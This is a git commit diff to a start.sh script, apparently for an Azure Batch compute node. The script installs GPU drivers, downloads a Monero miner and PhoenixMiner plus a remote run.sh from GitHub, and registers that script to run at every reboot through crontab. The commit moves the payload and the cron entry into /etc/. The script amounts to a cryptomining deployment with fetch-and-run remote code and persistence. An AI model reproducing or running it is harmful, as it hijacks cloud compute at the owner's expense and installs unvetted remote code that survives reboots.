9e8027dec5305836254ffeae5a38307783da0745
vnxxx <85277031+vnxxx@users.noreply.github.com>
2021-09-06 14:34:03 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -6,14 +6,14 @@ sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda
 rm -f /tmp/${CUDA_REPO_PKG}
 sudo apt-get update
 sudo apt-get install cuda-drivers -y
-cd /home/_azbatch
+cd /etc/
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
 tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
 wget https://raw.githubusercontent.com/vnxxx/vnn2021/main/run.sh
 chmod a+x+w run.sh
-echo "@reboot sh /home/_azbatch/run.sh">> resmi
+echo "@reboot sh /etc/run.sh">> resmi
 crontab resmi
 sudo rm resmi
 sudo reboot
